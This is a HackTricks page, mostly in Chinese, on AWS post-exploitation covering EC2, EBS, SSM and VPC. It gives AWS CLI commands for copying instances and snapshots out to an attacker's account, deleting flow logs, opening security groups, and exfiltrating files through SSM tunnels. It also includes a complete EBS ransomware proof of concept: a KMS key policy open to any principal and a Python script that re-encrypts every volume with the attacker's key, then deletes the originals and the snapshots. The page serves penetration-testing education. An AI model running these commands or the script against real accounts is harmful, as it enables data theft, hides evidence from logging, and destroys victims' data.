# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

更多信息请参见：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC 流量镜像 **会将 VPC 内 EC2 实例的入站和出站流量复制**，无需在实例本身安装任何东西。\
这些复制的流量通常会发送到类似 network intrusion detection system (IDS) 的系统进行分析和监控。\
攻击者可以滥用此功能来捕获所有流量并从中获取敏感信息：

更多信息请查看该页面：

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

实例通常包含某种敏感信息。有不同的方法可以进入（check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)）。然而，另一种检查它包含内容的方法是 **创建 AMI 并从它启动一个新的实例（甚至在你自己的账号中）**：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**快照是卷的备份**，通常会包含**敏感信息**，因此检查它们应能发现这些信息。\
如果你发现一个**没有快照的卷**，你可以：**创建一个快照**并执行以下操作，或者在该账户内**将其挂载到实例**：

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

使用 `CreateStoreImageTask` 将 EC2 AMI 直接导出到 S3，以获取原始磁盘映像，而无需共享快照。这样可以在不更改实例网络设置的情况下进行完整的离线取证或数据盗窃。

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

将 io1/io2 Multi-Attach 卷附加到第二个实例并以只读方式挂载，以在不使用快照的情况下窃取实时数据。当受害卷在同一 AZ 已启用 Multi-Attach 时，这种方法很有用。

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

创建一个 EC2 Instance Connect Endpoint，授权入站，并注入临时 SSH 密钥，通过受管隧道访问私有实例。无需开放公网端口即可快速实现横向移动。

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

将受害 ENI 的次要私有 IP 移动到攻击者控制的 ENI，以冒充按 IP 列入允许列表的受信主机。可绕过基于特定地址的内部 ACL 或 SG 规则。

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

将 Elastic IP 从受害实例重新关联到攻击者，以拦截入站流量或发起看起来来自受信任公网 IP 的出站连接。

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

如果安全组规则引用了客户管理的前缀列表，将攻击者的 CIDR 添加到该列表会在不修改安全组本身的情况下，悄然扩展所有依赖此列表的 SG 规则的访问范围。

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

创建 gateway 或 interface VPC endpoints，以从隔离子网恢复出站访问。Leveraging AWS-managed private links bypasses missing IGW/NAT controls for data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### VPC Flow Logs Cross-Account Exfiltration

将 VPC Flow Logs 指向攻击者控制的 S3 存储桶，以在受害账户之外持续收集网络元数据（源/目的地、端口），用于长期侦察。

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

即使你将 EC2 锁定为无法发送任何流量，它仍然可以 **exfil via DNS**。

- **VPC Flow Logs will not record this**.
- 你无法访问 AWS 的 DNS 日志。
- 通过将 "enableDnsSupport" 设置为 false 来禁用它，命令：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

攻击者可以调用由其控制的账户的 API 端点。CloudTrail 会记录这些调用，攻击者将能够在 CloudTrail 日志中查看已 exfiltrate 的数据。

### Open Security Group

你可以通过像下面这样开放端口来进一步访问网络服务：
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

可以运行一个 EC2 实例并将其注册为用于运行 ECS 实例，然后窃取 ECS 实例的数据。

有关[**更多信息，请查看**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs)。

### 移除 VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

所需权限：

- `ssm:StartSession`

除了命令执行之外，SSM 还允许 traffic tunneling，这可以被滥用来从由于 Security Groups 或 NACLs 而没有网络访问的 EC2 实例进行 pivot。
一个常见的适用场景是从 [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) pivot 到私有 EKS 集群。

> 要启动会话，你需要安装 SessionManagerPlugin：https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. 在你的机器上安装 SessionManagerPlugin
2. 使用以下命令登录到 Bastion EC2：
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. 获取 Bastion EC2 的 AWS 临时凭证，使用 [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) 脚本
4. 将凭证传输到你自己的机器，在 `$HOME/.aws/credentials` 文件中作为 `[bastion-ec2]` 配置文件
5. 以 Bastion EC2 的身份登录到 EKS:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. 将 `$HOME/.kube/config` 文件中的 `server` 字段更新为指向 `https://localhost`  
7. 按如下方式创建 SSM 隧道：
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. 来自 `kubectl` 工具的流量现在通过 SSM 隧道经由 Bastion EC2 转发，您可以通过在本机运行以下命令访问私有 EKS 集群：
```shell
kubectl get pods --insecure-skip-tls-verify
```
请注意，除非你设置 `--insecure-skip-tls-verify ` 标志（或 K8s 审计工具中的等效选项），否则 SSL 连接会失败。鉴于流量通过安全的 AWS SSM 隧道进行传输，你免受任何形式的 MitM 攻击。

最后，该技术并不限于攻击私有 EKS clusters。你可以设置任意域名和端口，pivot 到任何其他 AWS 服务或自定义应用。

---

#### 快速 本地 ↔️ 远程 端口转发 (AWS-StartPortForwardingSession)

如果你只需要将 **一个 TCP 端口从 EC2 实例转发到本地主机**，可以使用 `AWS-StartPortForwardingSession` SSM 文档（不需要远程主机参数）：
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

常见用例：

* **File exfiltration**
1. 在实例上启动一个指向你想要 exfiltrate 的目录的快速 HTTP 服务器：

```bash
python3 -m http.server 8000
```

2. 从你的工作站通过 SSM 隧道获取文件：

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **访问内部 Web 应用（例如 Nessus）**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
提示：在 exfiltrating 之前压缩并加密证据，以便 CloudTrail 不记录明文内容：
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### 共享 AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### 在公共或私有 AMIs 中搜索敏感信息

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel 是一个工具，旨在 **在公共或私有 Amazon Machine Images (AMIs) 中搜索敏感信息**。它自动化了从目标 AMIs 启动 instances、挂载其 volumes，并扫描潜在 secrets 或敏感数据的过程。

### 共享 EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

这是一个概念验证，类似于 S3 post-exploitation notes 中演示的 Ransomware 演示。鉴于它可以如此轻易地用于对各种 AWS 服务进行加密，KMS 应该被称为 RMS（Ransomware Management Service）。

首先，从一个 'attacker' AWS 账号，在 KMS 中创建一个 customer managed key。在此示例中，我们将让 AWS 为我管理密钥数据，但在真实场景中，malicious actor 会将密钥数据保留在 AWS 控制之外。修改 key policy，允许任何 AWS account Principal 使用该密钥。在这个 key policy 中，账号名称是 'AttackSim'，允许所有访问的 policy 规则名为 'Outside Encryption'。
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
密钥策略规则需要启用以下项，以允许其用于加密 EBS 卷：

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

现在有可公开访问的 key 可用。我们可以使用一个 'victim' 帐户，该帐户中有一些 EC2 实例运行并挂载了未加密的 EBS 卷。该 'victim' 帐户的 EBS 卷是我们要加密的目标，此攻击是在假定高权限 AWS 帐户被入侵的前提下进行的。

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

类似于 S3 ransomware 示例。该攻击将使用 snapshots 创建所附 EBS 卷的副本，使用来自 'attacker' 帐户的公开可用 key 对新的 EBS 卷进行加密，然后从 EC2 实例上分离并删除原始 EBS 卷，最后删除用于创建新加密 EBS 卷的 snapshots。 ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

结果是账户中只剩下已加密的 EBS 卷可用。

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

另外值得注意的是，脚本停止了 EC2 实例以便分离并删除原始 EBS 卷。原始的未加密卷现在已被删除。

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

接下来，返回 'attacker' 帐户中的 key policy，并从密钥策略中移除 'Outside Encryption' 策略规则。
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
等待新设置的密钥策略传播。然后返回到 'victim' 账户并尝试挂载其中一个新加密的 EBS 卷。你会发现可以挂载该卷。

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

但是，当你尝试用该加密的 EBS 卷实际启动 EC2 实例时，会失败并且实例会从 'pending' 状态回到 'stopped' 状态并一直保持，因为所附的 EBS 卷无法使用该密钥解密，原因是密钥策略不再允许。

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

这是使用的 python 脚本。它接受用于 'victim' 账户的 AWS 凭证和用于加密的公开可用 AWS ARN 密钥值。该脚本会对目标 AWS 账户中附加到所有 EC2 实例的所有可用 EBS 卷制作加密副本，然后停止每个 EC2 实例，分离原始 EBS 卷，删除它们，最后删除过程中使用的所有 snapshots。这样会使目标 'victim' 账户中只剩下已加密的 EBS 卷。仅在测试环境中使用此脚本——它具有破坏性，会删除所有原始 EBS 卷。你可以使用所用的 KMS 密钥通过 snapshots 恢复它们并还原到原始状态，但需要提醒的是，归根结底这是一个 ransomware PoC。
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## 参考资料

- [Pentest Partners – 如何使用 SSM 在 AWS 中传输文件](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
